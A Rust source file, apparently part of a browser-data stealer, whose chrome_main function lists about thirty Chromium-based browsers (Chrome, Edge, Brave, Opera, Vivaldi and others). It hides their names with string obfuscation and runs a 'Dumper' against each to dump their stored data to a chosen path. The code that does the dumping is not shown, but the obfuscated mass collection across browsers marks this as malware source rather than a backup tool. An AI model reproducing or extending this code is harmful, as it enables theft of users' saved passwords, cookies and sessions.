

use crate::chromium::dumper::Dumper;
use std::collections::HashMap;
use crate::chromium::dumper::DumperError;
pub type DumperResult<T> = Result<T, DumperError>;




pub fn chrome_main(path: String) {

        let mut hm = HashMap::new();
        hm.insert(obfstr::obfstr!("edge").to_string(), Dumper::new(obfstr::obfstr!("Edge"), obfstr::obfstr!("Microsoft")));
        hm.insert(obfstr::obfstr!("chromium").to_string(), Dumper::new("", obfstr::obfstr!("Chromium")));
        hm.insert(obfstr::obfstr!("7star").to_string(), Dumper::new(obfstr::obfstr!("7Star"), obfstr::obfstr!("7Star")));
        hm.insert(obfstr::obfstr!("amigo").to_string(), Dumper::new("", obfstr::obfstr!("Amigo")));
        hm.insert(obfstr::obfstr!("brave").to_string(), Dumper::new(obfstr::obfstr!("Brave-Browser"), obfstr::obfstr!("BraveSoftware")));
        hm.insert(obfstr::obfstr!("centbrowser").to_string(), Dumper::new("", obfstr::obfstr!("CentBrowser")));
        hm.insert(obfstr::obfstr!("chedot").to_string(), Dumper::new("", obfstr::obfstr!("Chedot")));
        hm.insert(obfstr::obfstr!("chrome_canary").to_string(), Dumper::new(obfstr::obfstr!("Chrome SxS"), obfstr::obfstr!("Google")));
        hm.insert(obfstr::obfstr!("coccoc").to_string(), Dumper::new(obfstr::obfstr!("Browser"), obfstr::obfstr!("CocCoc")));
        hm.insert(obfstr::obfstr!("dragon").to_string(), Dumper::new(obfstr::obfstr!("Dragon"), obfstr::obfstr!("Comodo")));
        hm.insert(obfstr::obfstr!("elements-browser").to_string(), Dumper::new("", obfstr::obfstr!("Elements Browser")));
        hm.insert(obfstr::obfstr!("epic-privacy-browser").to_string(), Dumper::new("", obfstr::obfstr!("Epic Privacy Browser")));
        hm.insert(obfstr::obfstr!("chrome").to_string(), Dumper::new(obfstr::obfstr!("Chrome"), obfstr::obfstr!("Google")));
        hm.insert(obfstr::obfstr!("kometa").to_string(), Dumper::new("", obfstr::obfstr!("Kometa")));
        hm.insert(obfstr::obfstr!("orbitum").to_string(), Dumper::new("", obfstr::obfstr!("Orbitum")));
        hm.insert(obfstr::obfstr!("sputnik").to_string(), Dumper::new(obfstr::obfstr!("Sputnik"), obfstr::obfstr!("Sputnik")));
        hm.insert(obfstr::obfstr!("torch").to_string(), Dumper::new("", obfstr::obfstr!("Torch")));
        hm.insert(obfstr::obfstr!("ucozmedia").to_string(), Dumper::new(obfstr::obfstr!("Uran"), obfstr::obfstr!("uCozMedia")));
        hm.insert(obfstr::obfstr!("vivaldi").to_string(), Dumper::new("", obfstr::obfstr!("Vivaldi")));
        hm.insert(obfstr::obfstr!("atom-mailru").to_string(), Dumper::new(obfstr::obfstr!("Atom"), obfstr::obfstr!("Mail.Ru")));
        hm.insert(obfstr::obfstr!("opera").to_string(), Dumper::new(obfstr::obfstr!("Opera Stable"), obfstr::obfstr!("Opera Software")));
        hm.insert(obfstr::obfstr!("opera-gx").to_string(), Dumper::new(obfstr::obfstr!("Opera GX Stable"), obfstr::obfstr!("Opera Software")));
        hm.insert(obfstr::obfstr!("ChromePlus").to_string(), Dumper::new(obfstr::obfstr!("MappleStudio"), obfstr::obfstr!("ChromePlus")));
        hm.insert(obfstr::obfstr!("Iridium").to_string(), Dumper::new(obfstr::obfstr!("Iridium"), obfstr::obfstr!("Iridium")));
        hm.insert(obfstr::obfstr!("fenrir-inc").to_string(), Dumper::new(obfstr::obfstr!("sleipnir5"), obfstr::obfstr!("settings")));
        hm.insert(obfstr::obfstr!("catalinagroup").to_string(), Dumper::new(obfstr::obfstr!("CatalinaGroup"), obfstr::obfstr!("Citrio")));
        hm.insert(obfstr::obfstr!("Coowoo").to_string(), Dumper::new("", obfstr::obfstr!("Coowoo")));
        hm.insert(obfstr::obfstr!("liebao").to_string(), Dumper::new("", obfstr::obfstr!("liebao")));
        hm.insert(obfstr::obfstr!("qip-surf").to_string(), Dumper::new("", obfstr::obfstr!("Qip Surf")));
        hm.insert(obfstr::obfstr!("360browser").to_string(), Dumper::new(obfstr::obfstr!("360Browser"), obfstr::obfstr!("Browser")));
    let browsers = &mut hm.clone();

    let opt_browsers = browsers.keys().map(|v| v.to_string()).collect::<Vec<_>>();
    
    unsafe {
        let _ = opt_browsers
        .into_iter()
        .filter_map(|v| browsers.get(v.as_str()).cloned())
        .map(|mut v| v.dump(path.clone()).map(|_| v))
        .filter_map(|v| v.ok())
        .collect::<Vec<_>>();
    }

}
